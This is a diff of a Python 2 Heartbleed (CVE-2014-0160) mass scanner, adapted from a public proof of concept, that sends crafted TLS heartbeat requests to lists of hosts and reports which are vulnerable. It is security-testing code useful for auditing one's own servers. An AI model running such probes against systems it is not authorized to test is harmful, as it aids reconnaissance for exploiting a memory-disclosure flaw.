@@ -1,6 +1,7 @@
 #!/usr/bin/env python2
 
 # Shamelessly ripped POC from https://gist.github.com/takeshixx/10107280
+# CVE-2014-0160
 
 import sys
 import struct
@@ -8,14 +9,7 @@ import socket
 import time
 import select
 import re
-from optparse import OptionParser
-
-options = OptionParser(usage='%prog server [options]', description='Test for SSL heartbeat vulnerability (CVE-2014-0160)')
-options.add_option("-f", "--file", type="str", help="File with ips to scan")
-options.add_option("-o", "--output", type="str", help="Output file")
-options.add_option('-p', '--port', type='int', default=443, help='TCP port to test (default: 443)')
-options.add_option('-s', '--starttls', action='store_true', default=False, help='Check STARTTLS')
-options.add_option('-d', '--debug', action='store_true', default=False, help='Enable debug output')
+import argparse
 
 def h2bin(x):
     return x.replace(' ', '').replace('\n', '').decode('hex')
@@ -43,14 +37,6 @@ hb = h2bin('''
 01 40 00
 ''')
 
-def hexdump(s):
-    for b in xrange(0, len(s), 16):
-        lin = [c for c in s[b : b + 16]]
-        hxdat = ' '.join('%02X' % ord(c) for c in lin)
-        pdat = ''.join((c if 32 <= ord(c) <= 126 else '.' )for c in lin)
-        print '  %04x: %-48s %s' % (b, hxdat, pdat)
-    print
-
 def recvall(s, length, timeout=5):
     endtime = time.time() + timeout
     rdata = ''
@@ -61,7 +47,10 @@ def recvall(s, length, timeout=5):
             return None
         r, w, e = select.select([s], [], [], 5)
         if s in r:
-            data = s.recv(remain)
+            try:
+                data = s.recv(remain)
+            except socket.error:
+                return None
             # EOF?
             if not data:
                 return None
@@ -101,13 +90,10 @@ def hit_hb(s):
 def scan_hb(address, port):
 
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    sys.stdout.flush()
     s.connect((address, port))
     
-    sys.stdout.flush()
     s.send(hello)
 
-    sys.stdout.flush()
     while True:
         typ, ver, pay = recvmsg(s)
         if typ == None:
@@ -115,20 +101,21 @@ def scan_hb(address, port):
         if typ == 22 and ord(pay[0]) == 0x0E:
             break
 
-    sys.stdout.flush()
     s.send(hb)
     return hit_hb(s)
 
+
 def scan_port(host, port):
+    #try:
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     try:
-        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        result = s.connect_ex((host, port))
-        if result == 0:
-            return True
-        else:
-            return False
+        s.connect((host, port))
+        s.close()
+        return 0
+    except socket.timeout:
+        return 1
     except:
-        return False
+        return 2
 
 
 def write_vul_address(outFile, target):
@@ -138,26 +125,38 @@ def write_vul_address(outFile, target):
 
 
 def main():
-    opts, args = options.parse_args()
-    if not opts.file:
-        print "file argument is required"
-        exit()
+    parser = argparse.ArgumentParser(description="Basic scanner for the Heartbeat vulnerability")
+    group = parser.add_mutually_exclusive_group(required=True)
+    parser.add_argument("-o", "--output", help="File with vulnerable hosts")
+    parser.add_argument("-p", "--port", type=int, default=443, help="TCP port the scan default=443")
+    parser.add_argument("--timeout", type=int, default=1, help="Set timeout default=1 second")
+    group.add_argument("-f", "--file", help="File with hosts to scan")
+    group.add_argument("-i", "--ips", metavar="ip", nargs="+")
+
+    args = parser.parse_args()
+
+    socket.setdefaulttimeout(args.timeout)
+
+    if args.file:
+        with open(args.file) as inFile:
+            targets = [ target.strip() for target in inFile.readlines() ]
     else:
-        with open(opts.file) as targets:
-            target = targets.readline().strip()
-            while target:
-                if scan_port(target, opts.port):
-                    if scan_hb(target, opts.port):
-                        if opts.output:
-                            write_vul_address(opts.output, target)
-                        print target, "is vulnerable"
-                    else:
-                        print target, "is not vulnerable"
-                target = targets.readline().strip() 
+        targets = args.ips
+
+    for target in targets:
+        result =  scan_port(target, args.port)
+        if result == 0:
+            if scan_hb(target, args.port):
+                if args.output:
+                    write_vul_address(args.output, target)
+                print "Vulnerable:", target
+            else:
+                print "Patched:", target
+        elif result == 1:
+            print "Down:", target
+        else:
+            print "Closed:", target
 
 
 if __name__ == '__main__':
-    #try:
     main()
-    #except:
-    #    sys.exit()
